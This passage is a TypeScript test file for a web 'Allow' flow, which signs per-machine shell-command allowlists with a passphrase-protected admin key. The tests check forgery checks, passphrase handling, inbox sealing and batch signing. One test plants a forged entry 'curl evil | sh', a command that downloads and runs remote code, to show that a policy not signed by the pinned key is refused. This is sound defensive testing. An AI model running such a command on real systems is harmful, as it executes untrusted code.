import { applyPolicy, encryptAdminKey, generateSigningKeyPair, keyId, nextPolicyBody as coreNext, signNoticeRecipients as coreSignList, signPolicy as coreSignPolicy, verifyInboxDocument, verifyNoticeRecipients as coreVerifyList, type SignedNoticeRecipients, type PolicyBody, type SignedPolicy } from '@wadeck-app/machine-core';
import { describe, expect, it, vi } from 'vitest';
import { adminKeyHolder } from './adminKeyHolder.js';
import { deliveryNotice, signingsSettled, trackSigning, loadContext, loadContexts, prepareAllow, prepareBatch, readAdminKeyHint, signAndSubmitAllow, signAndSubmitBatch, type AllowApi, type AllowContext } from './allowFlow.js';

// The flow of the Allow button without React: context, preview, unlock, signature, post. Real crypto (each unlock derives 600 000 PBKDF2 rounds:
// a few in this file, not more). The server side is a recording stub, so the tests can read EVERY byte that leaves the page.

const PASSPHRASE = 'correct horse battery staple 7391';
const NOW = Math.floor(Date.now() / 1000);
const SELF = '22222222-2222-4222-8222-222222222222';
const PEER = '11111111-1111-4111-8111-111111111111';
const SHELL = 'sh';

const admin = generateSigningKeyPair();
const ADMIN_KEY_ID = keyId(admin.publicKey);
const keyFile = JSON.stringify(encryptAdminKey(admin, PASSPHRASE));

const signedBase = (version: number, defaults: PolicyBody['defaults'] = [], peers: PolicyBody['peers'] = {}, key = admin): SignedPolicy =>
  coreSignPolicy({ v: 1, target: SELF, version, baseVersion: version - 1, adminKeyId: ADMIN_KEY_ID, issuedAt: NOW - 60, notBefore: NOW - 60, notAfter: NOW + 86400, defaults, peers }, key.privateKeyPkcs8);

function context(over: Partial<AllowContext> = {}): AllowContext {
  return { ok: true, target: { uuid: SELF, name: 'desktop' }, toSelf: true, policyMode: 'admin', adminKeyId: ADMIN_KEY_ID, adminPublicKey: admin.publicKey, current: null, source: 'installed on this machine', delivery: 'install', ...over };
}

interface Sent { method: string; path: string; body?: unknown }
function stubApi(answers: { get?: Record<string, unknown>; post?: unknown } = {}): AllowApi & { sent: Sent[]; elevated: number } {
  const sent: Sent[] = [];
  const api = {
    sent,
    elevated: 0,
    async elevate() { api.elevated++; },
    async get(path: string) {
      sent.push({ method: 'GET', path });
      const answer = answers.get?.[path];
      if (answer instanceof Error) {
        throw answer;
      }
      if (answer === undefined) {
        throw new Error(`no stub for GET ${path}`);
      }
      return answer;
    },
    async post(path: string, body: unknown) {
      sent.push({ method: 'POST', path, body });
      if (answers.post instanceof Error) {
        throw answers.post;
      }
      return answers.post ?? { ok: true, target: { uuid: SELF, name: 'desktop' }, version: 1, delivery: 'installed' };
    },
  };
  return api;
}

describe('loadContext', () => {
  it('asks for the PIN first, then reads the context of the machine and returns it', async () => {
    const api = stubApi({ get: { [`/allow/${SELF}`]: context() } });
    const loaded = await loadContext(api, SELF);
    expect(api.elevated).toBe(1);
    expect(api.sent).toEqual([{ method: 'GET', path: `/allow/${SELF}` }]);
    expect(loaded.target.name).toBe('desktop');
  });

  it('a cancelled PIN is reported as it is and nothing else is read', async () => {
    const api = stubApi();
    api.elevate = async () => { throw new Error('Sensitive action cancelled: PIN not entered'); };
    await expect(loadContext(api, SELF)).rejects.toThrow('PIN not entered');
    expect(api.sent).toEqual([]);
  });

  it('refuses an answer that is not a context, with the fix (an older module backend)', async () => {
    const api = stubApi({ get: { [`/allow/${SELF}`]: { nope: 1 } } });
    await expect(loadContext(api, SELF)).rejects.toThrow(/unexpected answer.*update the machine module/s);
  });
});

describe('prepareAllow (what the confirmation shows, before any passphrase)', () => {
  it('from no policy: version 0 -> 1, the one entry added, for every trusted peer', async () => {
    const prepared = await prepareAllow(context(), { shell: SHELL, command: 'uptime' }, NOW);
    expect(prepared).toMatchObject({ changed: true, fromVersion: 0, toVersion: 1, added: [{ shell: SHELL, command: 'uptime' }], defaultCount: 1, peersWithOwnList: [] });
  });

  it('from a policy it can verify: version + 1, and the peers that keep their own list are named', async () => {
    const current = signedBase(3, [{ shell: SHELL, command: 'ls' }], { [PEER]: [{ shell: SHELL, command: 'ls' }] });
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'uptime' }, NOW);
    expect(prepared).toMatchObject({ changed: true, fromVersion: 3, toVersion: 4, defaultCount: 2, peersWithOwnList: [PEER] });
  });

  it('already allowed: nothing to sign, said as such', async () => {
    const current = signedBase(1, [{ shell: SHELL, command: 'uptime' }]);
    expect(await prepareAllow(context({ current }), { shell: SHELL, command: 'uptime' }, NOW)).toEqual({ changed: false, reason: 'already-allowed' });
  });

  it('REFUSES a base the pinned admin key did not sign (a hostile backend must not slip entries into what the admin signs)', async () => {
    const forger = generateSigningKeyPair();
    const forged = signedBase(2, [{ shell: SHELL, command: 'curl evil | sh' }], {}, forger);
    await expect(prepareAllow(context({ current: forged }), { shell: SHELL, command: 'uptime' }, NOW)).rejects.toThrow(/not signed by the admin key pinned on this machine/);
  });

  it('refuses a base written for another machine', async () => {
    const other = coreSignPolicy({ ...signedBase(1).body, target: PEER }, admin.privateKeyPkcs8);
    await expect(prepareAllow(context({ current: other }), { shell: SHELL, command: 'uptime' }, NOW)).rejects.toThrow(/another machine/);
  });

  it('refuses a command text the policy cannot hold, naming the problem', async () => {
    await expect(prepareAllow(context(), { shell: SHELL, command: '' }, NOW)).rejects.toThrow(/must not be empty/);
    await expect(prepareAllow(context(), { shell: SHELL, command: 'echo é' }, NOW)).rejects.toThrow(/printable ASCII/);
  });

  it('refuses a shell that is not one of cmd, ps, bash, sh', async () => {
    await expect(prepareAllow(context(), { shell: 'zsh', command: 'ls' }, NOW)).rejects.toThrow(/shell must be one of/);
  });
});

describe('deliveryNotice: which path the policy took, in the words of the CLI (decision 86)', () => {
  const target = { uuid: SELF, name: 'thinkcentre' };

  it('shows the sentence of the daemon as it is, with its colour', () => {
    expect(deliveryNotice({ ok: true, target, version: 2, delivery: 'direct', deliveryText: { tone: 'success', text: 'Delivered directly to thinkcentre (installed, 0.4 s)' } })).toEqual({ tone: 'success', text: 'Delivered directly to thinkcentre (installed, 0.4 s)' });
    const fallback = { tone: 'warning' as const, text: 'thinkcentre is not reachable directly: stored in the relay inbox, it installs it when it comes back (next poll within 60 s, or 5 s while it holds a request). Cause: connect timed out' };
    expect(deliveryNotice({ ok: true, target, version: 2, delivery: 'inbox', deliveryText: fallback })).toEqual(fallback);
  });

  it('an older daemon sends no sentence: the page words the path itself, never "within about a minute"', () => {
    const inbox = deliveryNotice({ ok: true, target, version: 2, delivery: 'inbox' });
    expect(inbox.tone).toBe('warning');
    expect(inbox.text).toBe('Stored in the relay inbox of thinkcentre: it installs it at its next poll (within 60 s, or 5 s while it holds a request)');
    expect(deliveryNotice({ ok: true, target, version: 2, delivery: 'installed' })).toEqual({ tone: 'success', text: 'Installed on thinkcentre' });
    expect(deliveryNotice({ ok: true, target, version: 2, delivery: 'direct' })).toEqual({ tone: 'success', text: 'Delivered directly to thinkcentre' });
  });
});

describe('signAndSubmitAllow', () => {
  it('tells the progress that the policy is signed AFTER the signature and BEFORE the post, so the first step follows a real event', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const events: string[] = [];
    const original = api.post.bind(api);
    api.post = async (path, body) => {
      events.push('post');
      return original(path, body);
    };
    await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW, () => events.push('signed'));
    expect(events).toEqual(['signed', 'post']);
  });

  it('this machine: unlocks in the page, signs, posts ONLY the signed policy; machine-core accepts it and the passphrase appears nowhere in what was sent', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const ctx = context({ current: signedBase(2, [{ shell: SHELL, command: 'ls' }]) });
    const answer = await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
    expect(answer).toMatchObject({ ok: true, delivery: 'installed' });
    const post = api.sent.find((s) => s.method === 'POST');
    expect(post?.path).toBe('/allow');
    expect(Object.keys(post?.body as object)).toEqual(['policy']);
    const policy = (post?.body as { policy: SignedPolicy }).policy;
    // The very check the daemon of this machine makes (hard rule 4): signature, target, base version.
    const applied = applyPolicy({ version: 2, highestSeen: 2 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW, targetUuid: SELF });
    expect(applied.ok).toBe(true);
    expect(policy.body.defaults).toEqual([{ shell: SHELL, command: 'ls' }, { shell: SHELL, command: 'uptime' }]);
    // Everything that left the page, as text: no passphrase, no key material of the admin.
    const everything = JSON.stringify(api.sent);
    expect(everything).not.toContain(PASSPHRASE);
    expect(everything).not.toContain('privateKey');
    expect(Object.keys(post?.body as object)).not.toContain('document');
  }, 120_000);

  it('another machine: also posts the inbox document, which machine-core verifies for that machine, and the policy is the one in it', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ok: true, target: { uuid: PEER, name: 'laptop' }, version: 1, delivery: 'inbox' } });
    const targetKeys = generateSigningKeyPair();
    const ctx = context({ target: { uuid: PEER, name: 'laptop', identityPublicKey: targetKeys.publicKey }, toSelf: false, delivery: 'inbox', source: 'the last one signed here' });
    await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
    const body = api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy; document: unknown };
    expect(Object.keys(body).sort()).toEqual(['document', 'policy']);
    // Sealed to the target (decision 78): the page, the backend and the relay never carry the command in the document.
    expect(JSON.stringify(body.document)).not.toContain('uptime');
    const verified = verifyInboxDocument(body.document, { adminPublicKey: admin.publicKey, selfUuid: PEER, now: NOW, identityPrivateKeyPkcs8: targetKeys.privateKeyPkcs8 });
    expect(verified.ok).toBe(true);
    if (verified.ok && verified.kind === 'policy') {
      expect(verified.policy).toEqual(body.policy);
    }
    expect(JSON.stringify(api.sent)).not.toContain(PASSPHRASE);
  }, 120_000);

  describe('the list of notice recipients rides the Allow of another machine (request-notices.md)', () => {
    const targetKeys = generateSigningKeyPair();
    const inboxContext = (noticeRecipients?: AllowContext['noticeRecipients']) =>
      context({ target: { uuid: PEER, name: 'laptop', identityPublicKey: targetKeys.publicKey }, toSelf: false, delivery: 'inbox', source: 'the last one signed here', ...(noticeRecipients === undefined ? {} : { noticeRecipients }) });
    const answerOk = { ok: true, target: { uuid: PEER, name: 'laptop' }, version: 1, delivery: 'inbox' };
    const storedList = (recipients: string[] = [SELF], key = admin): SignedNoticeRecipients => coreSignList({ v: 1, adminKeyId: ADMIN_KEY_ID, serial: NOW - 500, issuedAt: NOW - 500, recipients }, key.privateKeyPkcs8);
    const posted = (api: ReturnType<typeof stubApi>) => api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy; document: unknown; noticeRecipients?: { signed: SignedNoticeRecipients; document: unknown } };

    it('reuses the list stored on the admin machine as it is, sealed to the target, in the same unlock', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ...answerOk, noticeRecipients: 'sent' } });
      const stored = storedList();
      const result = await signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: stored }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      const body = posted(api);
      expect(Object.keys(body).sort()).toEqual(['document', 'noticeRecipients', 'policy']);
      expect(Object.keys(body.noticeRecipients ?? {}).sort()).toEqual(['document', 'signed']);
      expect(body.noticeRecipients?.signed).toEqual(stored);
      const opened = verifyInboxDocument(body.noticeRecipients?.document, { adminPublicKey: admin.publicKey, selfUuid: PEER, now: NOW, identityPrivateKeyPkcs8: targetKeys.privateKeyPkcs8 });
      expect(opened).toMatchObject({ ok: true, kind: 'notice-recipients' });
      expect(result.noticeRecipients).toBe('sent');
      expect(JSON.stringify(api.sent)).not.toContain(PASSPHRASE);
    }, 120_000);

    it('signs a new list for this machine when none is stored (serial from the clock), and the core verifier accepts it', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ...answerOk, noticeRecipients: 'sent' } });
      await signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: null }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      const list = posted(api).noticeRecipients?.signed as SignedNoticeRecipients;
      expect(list.body).toMatchObject({ v: 1, adminKeyId: ADMIN_KEY_ID, serial: NOW, recipients: [SELF] });
      expect(coreVerifyList(list, { adminPublicKey: admin.publicKey })).toMatchObject({ ok: true });
    }, 120_000);

    it('REFUSES a stored list the pinned admin key did not sign, before the passphrase is used (a hostile backend cannot make the page vouch for it)', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
      const forged = storedList([PEER], generateSigningKeyPair());
      await expect(signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: forged }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/list of notice recipients.*not signed by the admin key pinned/s);
      expect(api.sent).toEqual([]);
    });

    it('an older module backend (no list in the context): the Allow goes through unchanged and the result says the list was not sent, with the fix', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: answerOk });
      const result = await signAndSubmitAllow(api, inboxContext(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      expect(Object.keys(posted(api)).sort()).toEqual(['document', 'policy']);
      expect(result.noticeRecipients).toBe('skipped');
      expect(result.noticeRecipientsMessage).toMatch(/machine admin notify-to/);
      expect(result.noticeRecipientsMessage).toMatch(/app-core-cli update/);
    }, 120_000);

    it('a list the daemon could not send is carried to the user with its own words', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ...answerOk, noticeRecipients: 'failed', noticeRecipientsMessage: 'the relay did not store the list: run machine admin notify-to' } });
      const result = await signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: storedList() }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      expect(result).toMatchObject({ noticeRecipients: 'failed', noticeRecipientsMessage: 'the relay did not store the list: run machine admin notify-to' });
    }, 120_000);
  });

  it('another machine, but the backend sent no identity key for it: nothing is signed or posted, and the message says to update the module', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const ctx = context({ target: { uuid: PEER, name: 'laptop' }, toSelf: false, delivery: 'inbox' });
    const error = await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW).catch((e: Error) => e);
    expect(error).toBeInstanceOf(Error);
    expect((error as Error).message).toMatch(/identity key of "laptop"/);
    expect((error as Error).message).toMatch(/update the machine module/i);
    // Not even the key file was read: nothing was unlocked.
    expect(api.sent).toEqual([]);
  });

  it('a wrong passphrase posts nothing and does not echo the passphrase', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const wrong = 'definitely not the passphrase 123';
    const error = await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, wrong, NOW).catch((e: Error) => e);
    expect(error).toBeInstanceOf(Error);
    expect((error as Error).message).toMatch(/wrong passphrase or damaged key file/);
    expect((error as Error).message).not.toContain(wrong);
    expect(api.sent.some((s) => s.method === 'POST')).toBe(false);
  }, 120_000);

  it('refuses a key file that unlocks to another admin key than the one pinned here, before signing anything', async () => {
    const other = generateSigningKeyPair();
    const otherFile = JSON.stringify(encryptAdminKey(other, PASSPHRASE));
    const api = stubApi({ get: { '/admin-key': { file: otherFile } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/not the admin key pinned on this machine/);
    expect(api.sent.some((s) => s.method === 'POST')).toBe(false);
  }, 120_000);

  it('a refusal of the daemon (stale base) reaches the user with its own words', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: new Error('the policy of "desktop" is at version 1 and this one was edited from version 0: reload the page and allow it again. Nothing was stored or sent') });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/reload the page and allow it again/);
  }, 120_000);

  it('nothing to change: no key file read, no passphrase used, nothing posted', async () => {
    const api = stubApi();
    const ctx = context({ current: signedBase(1, [{ shell: SHELL, command: 'uptime' }]) });
    await expect(signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/already allowed/);
    expect(api.sent).toEqual([]);
  });

  it('an unusable key file answer says what the backend sent wrong', async () => {
    const api = stubApi({ get: { '/admin-key': { nope: 1 } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/unexpected answer.*update the machine module/s);
  });
});

describe('the rule is the one of machine-core', () => {
  it('prepareAllow and machine-core produce the same next body for the same inputs', async () => {
    const current = signedBase(5, [{ shell: SHELL, command: 'ls' }]);
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'df -h' }, NOW);
    const core = coreNext(current.body, { target: SELF, adminKeyId: ADMIN_KEY_ID, now: NOW }, { kind: 'allow', entry: { shell: SHELL, command: 'df -h' } });
    expect(prepared.changed && core.changed ? prepared.body : null).toEqual(core.changed ? core.body : undefined);
  });
});

describe('the lifetime of the entry (limits), as the CLI --times / --for would sign it', () => {
  const entryOf = (policy: SignedPolicy, command: string) => policy.body.defaults.find((e) => 'command' in e && e.command === command);

  it('prepareAllow with a lifetime equals machine-core nextPolicyBody with the limits the core parser gives', async () => {
    const current = signedBase(5, [{ shell: SHELL, command: 'ls' }]);
    for (const [flags, limits] of [[{ times: '1' }, { maxCalls: 1 }], [{ times: '25' }, { maxCalls: 25 }], [{ for: '15m' }, { expiresAt: NOW + 900 }], [{ for: '1d' }, { expiresAt: NOW + 86400 }]] as const) {
      const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'df -h', lifetime: flags }, NOW);
      const core = coreNext(current.body, { target: SELF, adminKeyId: ADMIN_KEY_ID, now: NOW }, { kind: 'allow', entry: { shell: SHELL, command: 'df -h', limits } });
      expect(prepared.changed && core.changed ? prepared.body : null).toEqual(core.changed ? core.body : undefined);
    }
  });

  it('permanent (no lifetime) writes no limits key at all', async () => {
    const prepared = await prepareAllow(context(), { shell: SHELL, command: 'df -h' }, NOW);
    expect(prepared.changed && prepared.body.defaults[0]).toEqual({ shell: SHELL, command: 'df -h' });
  });

  it('signs and posts the entry with its limits, expiresAt counted from the signing time', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime', lifetime: { times: '1' } }, PASSPHRASE, NOW);
    const once = (api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy }).policy;
    expect(entryOf(once, 'uptime')).toEqual({ shell: SHELL, command: 'uptime', limits: { maxCalls: 1 } });
    const api2 = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await signAndSubmitAllow(api2, context(), { shell: SHELL, command: 'uptime', lifetime: { for: '15m' } }, PASSPHRASE, NOW + 5);
    const timed = (api2.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy }).policy;
    expect(entryOf(timed, 'uptime')).toEqual({ shell: SHELL, command: 'uptime', limits: { expiresAt: NOW + 5 + 900 } });
    // machine-core accepts what the page signed (hard rule 4).
    expect(applyPolicy({ version: 0, highestSeen: 0 }, timed, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW + 5, targetUuid: SELF }).ok).toBe(true);
  }, 120_000);

  it('an invalid lifetime is refused with the parser message before the key is read or anything is signed', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime', lifetime: { times: '0' } }, PASSPHRASE, NOW)).rejects.toThrow(/--times must be a whole number from 1 to 10000/);
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime', lifetime: { for: '400d' } }, PASSPHRASE, NOW)).rejects.toThrow(/at most 365 days/);
    expect(api.sent).toEqual([]);
  });

  it('allowing an entry that exists with the same lifetime is nothing to sign; with another lifetime it renews it', async () => {
    const current = signedBase(2, [{ shell: SHELL, command: 'uptime', limits: { maxCalls: 1 } }]);
    const same = await prepareAllow(context({ current }), { shell: SHELL, command: 'uptime', lifetime: { times: '1' } }, NOW);
    expect(same).toEqual({ changed: false, reason: 'already-allowed' });
    const renewed = await prepareAllow(context({ current }), { shell: SHELL, command: 'uptime', lifetime: { times: '5' } }, NOW);
    expect(renewed.changed && renewed.body.defaults).toEqual([{ shell: SHELL, command: 'uptime', limits: { maxCalls: 5 } }]);
  });
});

void vi;

describe('readAdminKeyHint (the hint is shown before the passphrase is typed)', () => {
  const hinted = (hint: string) => JSON.stringify(encryptAdminKey(admin, PASSPHRASE, { hint }));

  it('reads the hint from the key file, without any passphrase', async () => {
    const api = stubApi({ get: { '/admin-key': { file: hinted('the street of my first school') } } });
    expect(await readAdminKeyHint(api)).toBe('the street of my first school');
    expect(api.sent).toEqual([{ method: 'GET', path: '/admin-key' }]);
  });

  it('a key file without a hint gives undefined, not an error', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    expect(await readAdminKeyHint(api)).toBeUndefined();
  });

  it('a malformed hint is refused with the message of the key file reader', async () => {
    const envelope = { ...JSON.parse(hinted('ok')), hint: 'x'.repeat(81) };
    const api = stubApi({ get: { '/admin-key': { file: JSON.stringify(envelope) } } });
    await expect(readAdminKeyHint(api)).rejects.toThrow(/the hint is malformed.*restore the file from another machine/);
  });

  it('an answer that is not a key file says the page and the module differ, with the fix', async () => {
    const api = stubApi({ get: { '/admin-key': { nope: 1 } } });
    await expect(readAdminKeyHint(api)).rejects.toThrow(/unexpected answer.*update the machine module/s);
  });
});

describe('loadContexts (one PIN for every machine of a batch)', () => {
  it('asks for the PIN ONCE, then reads the context of each machine, in order', async () => {
    const laptop = context({ target: { uuid: PEER, name: 'laptop' }, toSelf: false, delivery: 'inbox' });
    const api = stubApi({ get: { [`/allow/${SELF}`]: context(), [`/allow/${PEER}`]: laptop } });
    const loaded = await loadContexts(api, [SELF, PEER]);
    expect(api.elevated).toBe(1);
    expect(api.sent.map((s) => s.path)).toEqual([`/allow/${SELF}`, `/allow/${PEER}`]);
    expect(loaded.map((c) => c.target.name)).toEqual(['desktop', 'laptop']);
  });

  it('a cancelled PIN reads nothing', async () => {
    const api = stubApi();
    api.elevate = async () => { throw new Error('Sensitive action cancelled: PIN not entered'); };
    await expect(loadContexts(api, [SELF, PEER])).rejects.toThrow('PIN not entered');
    expect(api.sent).toEqual([]);
  });
});

describe('signAndSubmitBatch (several requests, ONE unlock, one policy per machine)', () => {
  const targetKeys = generateSigningKeyPair();
  const laptopContext = (over: Partial<AllowContext> = {}) => context({ target: { uuid: PEER, name: 'laptop', identityPublicKey: targetKeys.publicKey }, toSelf: false, delivery: 'inbox', source: 'the last one signed here', noticeRecipients: { selfUuid: SELF, current: null }, ...over });
  const answerFor = (uuid: string, name: string, delivery: 'installed' | 'inbox') => ({ ok: true, target: { uuid, name }, version: 1, delivery });
  const batchApi = (post?: (path: string, body: unknown) => unknown) => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    api.post = async (path: string, body: unknown) => {
      api.sent.push({ method: 'POST', path, body });
      const policy = (body as { policy: SignedPolicy }).policy;
      const answer = post?.(path, body);
      if (answer instanceof Error) {
        throw answer;
      }
      return answer ?? (policy.body.target === SELF ? answerFor(SELF, 'desktop', 'installed') : answerFor(PEER, 'laptop', 'inbox'));
    };
    return api;
  };
  const posts = (api: ReturnType<typeof stubApi>) => api.sent.filter((s) => s.method === 'POST').map((s) => s.body as { policy: SignedPolicy; document?: unknown });
  const keyReads = (api: ReturnType<typeof stubApi>) => api.sent.filter((s) => s.method === 'GET' && s.path === '/admin-key').length;
  const E = (command: string, shell = SHELL) => ({ shell, command });

  it('three entries of one machine: ONE post holding the three entries in one version, the key file read once, machine-core accepts it, no passphrase leaves', async () => {
    const api = batchApi();
    const outcomes = await signAndSubmitBatch(api, [{ context: context(), entries: [E('ls'), E('df -h'), E('uptime')] }], { times: '1' }, PASSPHRASE, NOW);
    expect(posts(api)).toHaveLength(1);
    const policy = (posts(api)[0] as { policy: SignedPolicy }).policy;
    expect(policy.body.version).toBe(1);
    expect(policy.body.defaults).toEqual([
      { shell: SHELL, command: 'ls', limits: { maxCalls: 1 } },
      { shell: SHELL, command: 'df -h', limits: { maxCalls: 1 } },
      { shell: SHELL, command: 'uptime', limits: { maxCalls: 1 } },
    ]);
    expect(applyPolicy({ version: 0, highestSeen: 0 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW, targetUuid: SELF }).ok).toBe(true);
    expect(keyReads(api)).toBe(1);
    expect(outcomes).toMatchObject([{ status: 'posted', machine: { uuid: SELF, name: 'desktop' }, result: { delivery: 'installed' } }]);
    expect(JSON.stringify(api.sent)).not.toContain(PASSPHRASE);
  }, 120_000);

  it('two machines: two policies (each for its own target, the inbox one sealed with its notice list) in ONE unlock', async () => {
    const api = batchApi();
    const outcomes = await signAndSubmitBatch(api, [{ context: context(), entries: [E('ls')] }, { context: laptopContext(), entries: [E('hostname', 'cmd'), E('whoami', 'cmd')] }], {}, PASSPHRASE, NOW);
    const [first, second] = posts(api) as Array<{ policy: SignedPolicy; document?: unknown; noticeRecipients?: unknown }>;
    expect(posts(api)).toHaveLength(2);
    expect(first?.policy.body.target).toBe(SELF);
    expect(first?.document).toBeUndefined();
    expect(second?.policy.body.target).toBe(PEER);
    expect(second?.policy.body.defaults.map((e) => e.command)).toEqual(['hostname', 'whoami']);
    expect(verifyInboxDocument(second?.document, { adminPublicKey: admin.publicKey, selfUuid: PEER, now: NOW, identityPrivateKeyPkcs8: targetKeys.privateKeyPkcs8 }).ok).toBe(true);
    expect(second?.noticeRecipients).toBeDefined();
    expect(keyReads(api)).toBe(1);
    expect(outcomes.map((o) => o.status)).toEqual(['posted', 'posted']);
    expect(JSON.stringify(api.sent)).not.toContain(PASSPHRASE);
  }, 120_000);

  it('the same text twice is ONE entry', async () => {
    const api = batchApi();
    await signAndSubmitBatch(api, [{ context: context(), entries: [E('ls'), E('ls'), E('df -h')] }], {}, PASSPHRASE, NOW);
    expect((posts(api)[0] as { policy: SignedPolicy }).policy.body.defaults.map((e) => e.command)).toEqual(['ls', 'df -h']);
  }, 120_000);

  it('an entry the policy cannot hold on ONE machine signs NOTHING for the others: the key file is not even read', async () => {
    const api = batchApi();
    const error = await signAndSubmitBatch(api, [{ context: context(), entries: [E('ls')] }, { context: laptopContext(), entries: [E(`echo caf${String.fromCharCode(233)}`)] }], {}, PASSPHRASE, NOW).catch((e: Error) => e);
    expect((error as Error).message).toMatch(/laptop.*printable ASCII/s);
    expect(api.sent).toEqual([]);
  });

  it('a list that would exceed the limit is refused with the numbers, nothing read or signed', async () => {
    const api = batchApi();
    const full = Array.from({ length: 199 }, (_v, i) => ({ shell: SHELL, command: `cmd-${i}` }));
    const ctx = context({ current: signedBase(1, full as PolicyBody['defaults']) });
    const error = await signAndSubmitBatch(api, [{ context: ctx, entries: [E('a1'), E('a2')] }], {}, PASSPHRASE, NOW).catch((e: Error) => e);
    expect((error as Error).message).toMatch(/201 entries.*at most 200/s);
    expect(api.sent).toEqual([]);
  });

  it('a base the pinned key did not sign is refused for the whole batch, before anything is read', async () => {
    const api = batchApi();
    const forged = signedBase(1, [], {}, generateSigningKeyPair());
    await expect(signAndSubmitBatch(api, [{ context: context({ current: forged }), entries: [E('ls')] }], {}, PASSPHRASE, NOW)).rejects.toThrow(/not signed by the admin key pinned/);
    expect(api.sent).toEqual([]);
  });

  it('another machine without its identity key: refused before the unlock, naming the machine', async () => {
    const api = batchApi();
    await expect(signAndSubmitBatch(api, [{ context: context(), entries: [E('ls')] }, { context: laptopContext({ target: { uuid: PEER, name: 'laptop' } }), entries: [E('ls')] }], {}, PASSPHRASE, NOW)).rejects.toThrow(/identity key of "laptop"/);
    expect(api.sent).toEqual([]);
  });

  it('a wrong passphrase posts nothing and does not echo it', async () => {
    const api = batchApi();
    const wrong = 'definitely not the passphrase 123';
    const error = await signAndSubmitBatch(api, [{ context: context(), entries: [E('ls')] }], {}, wrong, NOW).catch((e: Error) => e);
    expect((error as Error).message).toMatch(/wrong passphrase or damaged key file/);
    expect((error as Error).message).not.toContain(wrong);
    expect(posts(api)).toHaveLength(0);
  }, 120_000);

  it('one machine failing does not hide the other: both outcomes are reported, and the signature is announced before any post', async () => {
    const events: string[] = [];
    const api = batchApi((_path, body) => {
      events.push('post');
      return (body as { policy: SignedPolicy }).policy.body.target === PEER ? new Error('the relay refused the inbox document: try again in a minute') : undefined;
    });
    const outcomes = await signAndSubmitBatch(api, [{ context: context(), entries: [E('ls')] }, { context: laptopContext(), entries: [E('ls')] }], {}, PASSPHRASE, NOW, () => events.push('signed'));
    expect(events[0]).toBe('signed');
    expect(outcomes).toMatchObject([{ status: 'posted', machine: { name: 'desktop' } }, { status: 'failed', machine: { name: 'laptop' }, message: 'the relay refused the inbox document: try again in a minute' }]);
  }, 120_000);

  it('an entry already allowed on one machine: that machine is reported unchanged (nothing signed for it), the other is posted', async () => {
    const api = batchApi();
    const ctx = context({ current: signedBase(1, [{ shell: SHELL, command: 'ls' }]) });
    const outcomes = await signAndSubmitBatch(api, [{ context: ctx, entries: [E('ls')] }, { context: laptopContext(), entries: [E('ls')] }], {}, PASSPHRASE, NOW);
    expect(outcomes).toMatchObject([{ status: 'unchanged', machine: { name: 'desktop' }, message: expect.stringMatching(/already allowed on "desktop"/) }, { status: 'posted', machine: { name: 'laptop' } }]);
    expect(posts(api)).toHaveLength(1);
  }, 120_000);

  it('everything already allowed: nothing to sign, the key file is not read', async () => {
    const api = batchApi();
    const ctx = context({ current: signedBase(1, [{ shell: SHELL, command: 'ls' }]) });
    await expect(signAndSubmitBatch(api, [{ context: ctx, entries: [E('ls')] }], {}, PASSPHRASE, NOW)).rejects.toThrow(/already allowed.*nothing to sign/s);
